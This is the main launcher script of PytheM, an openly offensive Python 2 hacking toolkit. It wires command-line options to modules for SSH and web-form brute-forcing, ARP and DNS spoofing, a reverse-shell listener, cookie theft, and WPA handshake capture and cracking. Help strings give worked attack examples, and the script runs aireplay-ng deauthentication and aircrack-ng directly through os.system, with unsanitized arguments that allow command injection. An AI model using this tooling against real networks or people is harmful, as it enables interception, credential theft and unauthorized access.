#!/usr/bin/env python2.7
#coding=UTF-8

# Copyright (c) 2016 m4n3dw0lf
#
# This file is part of the program PytheM
#
# PytheM is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA


from scapy.all import *
from modules.banners import*
from modules.utils import*
from time import sleep
import os
import sys
import threading
import signal
import argparse

print get_banner()

pythem_version = '0.2.0'
pythem_codename = 'Saw-scaled Viper'

if os.geteuid() !=0:
	sys.exit("[-] Only for roots kid!")



if __name__ == '__main__':

# Opções

	parser = argparse.ArgumentParser(description="PytheM v{} = '{}'".format(pythem_version, pythem_codename),version="{} - '{}'".format(pythem_version,pythem_codename),usage="pythem.py -i interface [plugin] [plugin_options]", epilog="By: m4n3dw0lf")

	parser.add_argument("-i","--interface",required=True,type=str, help="Network interface to use.")
	parser.add_argument("-g","--gateway",dest='gateway', help="Gateway IP addres.")
	parser.add_argument("-t","--targets",dest='targets', help="Target IP Address/Range.")
	parser.add_argument("-f","--file",dest='file',help ="Path to a file.")

	bruter = parser.add_argument_group('[Brute-Force]')
	bruter.add_argument("--bruter", action='store_true', help="Initialize a service brute-force attack, requires a wordlist.")
	bruter.add_argument("--service", type=str, dest='service', choices=["ssh"], help="Brute-force service to be attacked. ex: ./pythem.py -i wlan0 --bruter --service ssh -t 10.0.0.1 -f /usr/share/wordlist.txt -u username")
	bruter.add_argument("-u","--username",dest='username',help ="Username to be used in the brute-force attack.")

	mitm = parser.add_argument_group('[Man-In-The-Middle]')
	mitm.add_argument("--arpspoof", action='store_true', help="Redirects traffic using ARP spoofing. ex: './pythem.py -i wlan0 --arpspoof -g gateway --sniff options'")
	mitm.add_argument("--arpmode",type=str, dest='arpmode', default='rep', choices=["rep", "req"], help=' ARP spoof mode: reply(rep) or requests (req) [default: rep].')
	mitm.add_argument("--dnsspoof", action='store_true', help="DNS spoof a specific domain query to the attacker machine, ARP spoofing required. ex: './pythem.py -i wlan0 --arpspoof -g 10.0.0.1 --dnsspoof --domain www.facebook.com")
	mitm.add_argument("--domain",type=str, dest='domain', help="Domain name to dnsspoof and redirect to your machine.")	

	remote = parser.add_argument_group('[Remote]')
	remote.add_argument("--ssh", action='store_true', help="Waits for a SSH/TCP reverse connection from target. ex: ./pythem.py --ssh -l -p 7001")
	remote.add_argument("-l","--server",dest='server',nargs='?' ,const='0.0.0.0', help="Server IP address to listen, default[0.0.0.0']")
	remote.add_argument("-p","--port",dest='port',nargs='?', const=7000, help="Server port to listen, default=[7000]")

	sniff = parser.add_argument_group('[Sniffing]')
	sniff.add_argument("--sniff", action="store_true", help="Enable packets sniffing. ex: './pythem.py -i wlan0 --sniff --filter manual")
	sniff.add_argument("--filter",type=str, dest='filter', default='dns', choices=['dns','http','manual'], help=" Sniffing filter: dns, http or manual [default=dns]. ex: './pythem.py -i wlan0 --arpspoof -g 192.168.1.1 --filter http'")
	sniff.add_argument("--pforensic",action="store_true", help=" Read .pcap file and start interactive shell for analyze the packets. ex: './pythem.py -i wlan0 --pforensic -f /path/file.pcap'.")

	scan = parser.add_argument_group('[Scanning]')
	scan.add_argument("--scan", action='store_true', help="Do a TCP scan in a Address/Range IP to discover hosts. ex: './pythem.py -i wlan0 --scan -t 192.168.0.0/24 --mode arp'.")
	scan.add_argument("--mode",type=str, dest='mode', default='tcp',choices = ["tcp","arp","manual"], help="Scan mode: manual,tcp or arp default=[tcp].")

	utils = parser.add_argument_group('[Utils]')
	utils.add_argument("--decode", type=str,dest='decode', help="Decodes a string with choosen pattern. ex: ./pythem.py -i wlan0 --decode base64")  
	utils.add_argument("--encode", type=str, dest='encode', help="Encodes a string with choosen pattern. ex: ./pythem.py -i wlan0 --encode hex")
	utils.add_argument("--geoip",action='store_true',help="Geolocalizate approximately the location of the IP address. ex:./pythem.py -i wlan0 --geoip --target 216.58.222.46")

	web = parser.add_argument_group('[Web]')
	web.add_argument("--urlbuster", action='store_true', help="Initialize a URL brute-force attack, requires a wordlist. ex: './pythem.py -i wlan0 --urlbuster -t http://testphp.vulnweb.com/index.php?id= -f /path/wordlist.txt'")
	web.add_argument("--formbruter", action='store_true', help="Initialize a web page formulary brute-force attack, requires a wordlist. ex: './pythem.py -i wlan0 --formbruter -t http://testphp.vulnweb/login.php -f /path/wordlist.txt'")
	web.add_argument("--cookiedump", action='store_true', help="Dump a cookie value from URL(Normal request or with Authentication required). ex: './pythem.py -i wlan0 --cookiedump -t http://testphp.vulnweb.com'.")
	web.add_argument("--cookiedecode", action='store_true', help="Decode a base64 encoded cookie value.")

	wireless = parser.add_argument_group('[Wireless]')
	wireless.add_argument("--startmon", action='store_true' ,help='Initialize monitor mode on desired interface. ex. "./pythem.py -i wlan0 --startmon"')		
	wireless.add_argument("--stopmon",action='store_true', help='Terminate monitor mod on desired interface. ex: "./pythem.py -i wlan0mon --stopmon"')
	wireless.add_argument("--dumpmon",action='store_true',help="Discover Access points SSID's that are near with the monitor interface. ex: './pythem.py -i wlan0mon --dumpmon'")
	wireless.add_argument("-c","--channel", type=str, dest='channel', help = "Channel to wpahandshake.")
	wireless.add_argument("--wpahandshake", action='store_true' , help="Initialize a aircrack-ng suit attack to retrieve WPA handshake and write to .pcap file. ex:' ./pythem.py -i wlan0mon --wpahandshake -c 2 -t 8C:10:D4:D8:0B:96 -f handshake' .")
	wireless.add_argument("--wpabruteforce", action='store_true', help="Initialize aircrack-ng brute-force attack into .pcap file. ex: './pythem.py -i wlan0 --wpabruteforce -f wordlist.txt -t handshake.pcap' .")	
	
	if len(sys.argv) < 2:
    		parser.print_help()
    		sys.exit(1)

	args = parser.parse_args()

	interface = args.interface
	gateway = args.gateway
	targets = args.targets

	startmon = args.startmon
	stopmon = args.stopmon
	wpahandshake = args.dumpmon
	channel = args.channel	
	
	mode = args.mode

	arpmode = args.arpmode
	domain = args.domain

	filter = args.filter
	
	server = args.server
	port = args.port

	service = args.service
	file = args.file
	username = args.username
			
	based = str(args.decode)
	basee = str(args.encode)
	



	if args.scan:
		try:
			if targets is not None:
				from modules.scanner import Scanner
				scan = Scanner(targets,interface,mode)
				scan.start()
			else:
				print "[!] Select a valid IP address/range as target with -t ."
				sys.exit(0)
		except KeyboardInterrupt:
			print "[*] User requested shutdown."
			sys.exit(1)


	elif args.arpspoof and args.sniff:
		try:
			myip = get_myip(interface)
			mymac = get_mymac(interface)
			from modules.arpoisoner import ARPspoof
			spoof = ARPspoof(gateway,targets, interface, arpmode, myip, mymac)
			spoof.start()
			from modules.sniffer import Sniffer
			sniff = Sniffer(interface, filter)
			sniff.start()

		except KeyboardInterrupt:
			spoof.stop()
			print "[*] User requested shutdown."
			sys.exit(1)
	elif args.dnsspoof:
		try:
                        myip = get_myip(interface)
			filter = "http"
			from modules.dnspoisoner import DNSspoof
			dnsspoof = DNSspoof(domain,myip)
			dnsspoof.main()
			from modules.sniffer import Sniffer
			sniff = Sniffer(interface, filter)
			sniff.start()
		except KeyboardInterrupt:
			dnsspoof.stop()
			print "[*] User requested shutdown."
			sys.exit(1)

	elif args.arpspoof:
		try:	
                        myip = get_myip(interface)
                        mymac = get_mymac(interface)
			print "[*] Use --sniff to sniff intercepted packets, poisoning in threading."
			from modules.arpoisoner import ARPspoof
			spoof = ARPspoof(gateway,targets,interface,arpmode, myip, mymac)
			spoof.start()
			
		except KeyboardInterrupt:
			spoof.stop()
			print "[*] User requested shutdown."
			sys.exit(1)
	
	elif args.sniff:
		try:
			from modules.sniffer import Sniffer
			sniff = Sniffer(interface,filter)
			sniff.start()
		
		except KeyboardInterrupt:
			print "[*] User requested shutdown."
			sys.exit(1)
	
	elif args.pforensic:
		try:
			from modules.pforensic import PcapReader
			pcapread = PcapReader(file)
			pcapread.start()
		except KeyboardInterrupt:	
			print "[*] User requested shutdown."
			sys.exit(1)
                except TypeError:
                        print "[!] Select a file with -f /path/file.pcap"
                        sys.exit(0)



	elif args.ssh:
		try:
			from modules.reverse_shell import Server
			server = Server(server,port)
			server.start()
		except KeyboardInterrupt:
			server.stop()
			print "[*] User requested shutdown."
			sys.exit(1)
		except TypeError:
			print "[!] Missing the arguments -l and/or -p."
			sys.exit(0)
	
	elif args.urlbuster:
		try:
			url = 'url'
			if targets is None:
				print "[!] Select a valid URL as target with -t (remeber of http:// and / (slash)"
				sys.exit(0)
			else:
				from modules.web_bruter import WEBbrutus
				brutus = WEBbrutus(targets, file)
				brutus.start(url)
		except KeyboardInterrupt:
			print "[*] User requested shutdown."
			sys.exit(1)
                except TypeError:
                        print "[!] Select a file with -f /path/wordlist.txt"
                        sys.exit(0)
	elif args.formbruter:
		try:
			form = 'form'
			if targets is None:
				print "[!] Select a valid URL target with -t ."
				sys.exit(0)
			else:
				from modules.web_bruter import WEBbrutus
				brutus = WEBbrutus(targets, file)
				brutus.start(form)
		except KeyboardInterrupt:
			print "[*] User requested shutdown."
			sys.exit(1)
		except TypeError:
			print "[!] Select a file with -f /path/wordlist.txt"
			sys.exit(0)

	elif args.bruter:

		try:
			if targets is None:
				print "[!] Select a valid IP address as target with -t"
			else:
				from modules.ssh_bruter import SSHbrutus
				brutus = SSHbrutus(targets, username, file)
				brutus.start()
		except KeyboardInterrupt:
			print "[*] User requested shutdown."
			sys.exit(1)
                except TypeError:
                        print "[!] Select a file with -f /path/arquivo.txt"
                        sys.exit(0)

	elif args.cookiedump:
		try:
			if targets is None:
				print "[!] Select a valid URL as target with -t "
				sys.exit(0)
			else:
				from modules.cookiethief import CookieThief
				cookiedump = CookieThief(targets)
				cookiedump.start()
		except KeyboardInterrupt:
			print "[*] User requested shutdown."
			sys.exit(0)
			

	elif args.geoip:
		try:
			if targets is None:
				print "[!] Select a valid IP address as target with -t"
				sys.exit(0)
			else:
				from modules.geoip import Geoip
				path = "config/GeoLiteCity.dat"
				iptracker = Geoip(targets,path)
		
		except KeyboardInterrupt:
			print "[*] User requested shutdown."
			sys.exit(1)	

        elif args.decode:
                try:print decode(based)
                except KeyboardInterrupt:
                        print "\n[*] User requested shutdown."
                        sys.exit(0)
        elif args.encode:
                try:print encode(basee)
                except KeyboardInterrupt:
                        print "\n[*] User requested shutdown."
                        sys.exit(0)

	elif args.cookiedecode:
		try:cookiedecode()
		except KeyboardInterrupt:
			print "\n[*] User requested shutdown."
			sys.exit(0)

	elif args.startmon:
		try:
			os.system("airmon-ng check kill")
			os.system("airmon-ng start %s" % interface)
		except:
			module_check('aircrack-ng')	

	elif args.stopmon:
		try:
			os.system("airmon-ng stop %s" % interface)
			os.system("service network-manager restart")
		except Exception as e:
			print "[*] Exception caught: {}".format(e)
			sys.exit(0)

	elif args.dumpmon:
		try:
			os.system("airodump-ng %s" % interface)
		except Exception as e:
			print "[*] Exception caught: {}".format(e)
			sys.exit(0)


	elif args.wpahandshake:
		if args.channel == None or args.targets == None or args.file == None:
			print "[-] Select a valid channel with -c, a valid bssid with -t and a valid file to write .pcap with -f ."
			sys.exit(0)
		else:
			try:
				os.system("aireplay-ng %s -0 10 -a %s  "%(interface, targets)) 
				os.system("airodump-ng %s --bssid %s -c %s -w %s"%(interface, targets, channel, file))
			except Exception as e:
				print "[*] Exception caught: {}".format(e)
	elif args.wpabruteforce:
		if args.file == None or args.targets == None:
			print "[-] Select a valid .pcap handshake with -t and a valid wordlist with -f"
			sys.exit(0)
		else:
			try:
				os.system("aircrack-ng %s -w %s" % (targets, file))
			except Exception as e:
				print "[*] Exception caught: {}".format(e)
	else:
		print "[!] Select a valid option, check your sintax with --help."
		sys.exit(1)

	
